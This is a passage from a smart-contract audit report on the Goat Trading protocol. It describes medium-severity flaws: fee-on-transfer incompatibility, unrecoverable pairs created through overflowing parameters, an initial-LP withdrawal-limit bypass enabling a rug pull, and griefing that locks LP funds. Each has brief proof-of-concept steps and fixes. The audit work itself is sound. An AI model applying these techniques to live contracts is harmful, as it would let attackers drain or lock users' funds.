In [withdrawFees(pair)](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) add a require statement to prevent fees being withdrawn on behalf of the pool.
```solidity
require(to != address(this));
```

# Issue M-4: The router is not compatible with fee on transfers tokens 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/67 

## Found by 
1337, MohammedRizwan, Solidity\_ATL\_Team\_2, joshuajee, juan, zzykxx
## Summary

The router is not compatible with fee on transfers tokens.

## Vulnerability Detail

Let's take as example the [removeLiquidity](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L111) function:

```solidity
address pair = GoatV1Factory(FACTORY).getPool(token);

IERC20(pair).safeTransferFrom(msg.sender, pair, liquidity); //-> 1. Transfers liquidity tokens to the pair
(amountWeth, amountToken) = GoatV1Pair(pair).burn(to); //-> 2. Burns the liquidity tokens and sends WETH and TOKEN to the recipient
if (amountWeth < wethMin) { //-> 3. Ensures enough WETH has been transferred
    revert GoatErrors.InsufficientWethAmount();
}
if (amountToken < tokenMin) { //4. Ensures enough TOKEN has been transferred
    revert GoatErrors.InsufficientTokenAmount();
}
```

It does the following:

1. Transfers liquidity tokens to the pair.
2. Burns the liquidity tokens and sends WETH and TOKEN to the recipient `to`.
3. Ensures enough WETH has been transferred.
4. Ensures enough TOKEN has been transferred.

At point `4` the router doesn't account for the fee paid to transfer TOKEN. The recipient didn't actually receive `amountToken`, but slightly less because a fee has been charged.

Another interesting example is the [removeLiquidityETH](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/periphery/GoatRouterV1.sol#L131) which first burns the liquidity and transfers the tokens to the router itself, and then from the router the tokens are transferred to the recipient. This will charge double the fees.

This is just two examples to highlight the fact that these kind of tokens are not supported, but the other functions in the router have similar issues that can cause all sorts of trouble including reverts and loss of funds.

## Impact

The router is not compatible with fee on transfers tokens.

## Code Snippet

## Tool used

Manual Review

## Recommendation

Add functionality to the router to support fee on transfer tokens, a good example of where this is correctly implememented is the [Uniswap Router02](https://etherscan.io/address/0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  as per the readMe the contract should support FOT; medium(1)



# Issue M-5: It's possible to create pairs that cannot be taken over 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/69 

## Found by 
Solidity\_ATL\_Team\_2, ayoashy, y4y, zzykxx
## Summary

It's possible to create pairs that cannot be taken over and DOS a pair forever.

## Vulnerability Detail

A pair is created by calling [createPair()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Factory.sol#L33) which takes the initial parameters of the pair as inputs but the initial parameters are never verified, which makes it possible for an attacker to create a token pair that's impossible to recover via [takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L452).

There's more ways to create a pair that cannot be taken over, a simple example is to set all of the initial parameters to the maximum possible value:

```solidity
uint112 virtualEth = type(uint112).max;
uint112 bootstrapEth = type(uint112).max;
uint112 initialEth = type(uint112).max;
uint112 initialTokenMatch = type(uint112).max;
```

This will make [takeOverPool()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L452) revert for overflow on the internal call to [_tokenAmountsForLiquidityBootstrap](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L859-L862):

```solidity
uint256 k = virtualEth * initialTokenMatch;
@> tokenAmtForAmm = (k * bootstrapEth) / (totalEth * totalEth);
```

Here `virtualEth`, `initialTokenMatch` and `bootstrapEth` are all setted to `type(uint112).max`. The multiplication `virtualEth * initialTokenMatch * bootstrapEth` performed to calculate `tokenAmtForAmm` will revert for overflow because `2^112 * 2^112 * 2^112 = 2^336` which is bigger than `2^256`.

## Impact

Creation of new pairs can be DOSed forever.

## Code Snippet

## Tool used

Manual Review

## Recommendation

Validate a pair initial parameters and mint liquidity on pool creation.

# Issue M-6: Initial Liquidity provider can bypass the withdrawal limit 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/94 

## Found by 
AhmedAdam
## Summary

the initial liquidity provider can bypass maximum withdrawal limit and withdraw all the liquidity that he has leading to a rug pull.

## Vulnerability Detail

According to the protocol documentation, mandatory liquidity locks are implemented, restricting the initial liquidity provider to withdraw only 25% of their liquidity each week. The check for this restriction is enforced within the `_beforeTokenTransfer` function as follows: 
```solidity=910
if (amount > lpInfo.fractionalBalance) {
                    revert GoatErrors.BurnLimitExceeded();
                }
```
but this check isn't done if the number of withdrawals left for the lp is 1.
so the initial liquidity provider can withdraw the whole amount of lp tokens that he has, bypassing the 25% limit.

## Proof of Concept:

- Assume the initial liquidity provider holds 100 LP tokens of the pair tokenA/WETH, and the pool is in the AMM phase.
- Over the first three weeks, they burn 1 LP token each week.
- By the fourth week, they have 97 LP tokens remaining, and they withdraw all of them.
- This action effectively results in a rug pull, harming the users of the protocol.

## Impact

a key invariant of the system gets breached by having the inital liquidity provider able to bypass the withdraw limit

## Code Snippet

https://github.com/sherlock-audit/2024-03-goat-trading/blob/beb09519ad0c0ec0fdf5b96060fe5e4aafd71cff/goat-trading/contracts/exchange/GoatV1Pair.sol#L886-L909

## Tool used

Manual Review

# Issue M-7: lock of funds for the initial liquidity provider under some cicumstances 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/102 

## Found by 
AhmedAdam
## Summary

if the initial liquidity provider withdraws lpTokens less than 25% of the total lp tokens that he has, some of it ill be locked until he has 1 wthdrawLeft , and he can be griefied by malicious users each week to not get that amount out.

## Vulnerability Detail

the protocol imlements liquidity locks where the initil lp shouldn't be able to withraw more than 25% a week. 
the amount that the admin can withdraw is stored in `_initialLPInfo.fractionalBalance`  , which is set initially to 25% of the liquidity.
but after each new mint the new fractionalbalance is calcualted like so :
```solidity=666
info.fractionalBalance = uint112(((info.fractionalBalance * info.withdrawalLeft) + liquidity) / 4);

```

but if the initial lp withdraws an amount that is less than fractionalBalance then the next time he adds liquidity , frational balance will be set to a wrong lower amount.
this amount will be locked for at most 3 other weeks, but a griefer can mint a minimal amount for the initial lp to lock it for another 4 weeks.

- let's assume that the initial liquidity provider has 100 lp token of pair tokenA/WETH, and the pool is in AMM phase
- the initial lp withdraws 5 lp tokens , lowering the withdrawalLeft to 3
- then the initial lp mints 100lp tokens , the calcualtion in `_updateInitialLpInfo` is `            info.fractionalBalance = uint112(((25 * 3) + 100) / 4);
` which is 175 / 4 = 43.75 
- meaning that he lost 20 lp tokens unless he reaches the final withdraw where he can withdraw the whole balance
- a malicious user can detect this and grief the user by minting a small amount to the victim leading to resetting the withdraw left counter to 4 meaning that the lp user has to wait 4 weeks to withdraw his lost balance.

## Impact

the initial lp can have some of his funds locked indefintly by griefer.

## Code Snippet

https://github.com/sherlock-audit/2024-03-goat-trading/blob/beb09519ad0c0ec0fdf5b96060fe5e4aafd71cff/goat-trading/contracts/exchange/GoatV1Pair.sol#L886-L909

## Tool used

Manual Review


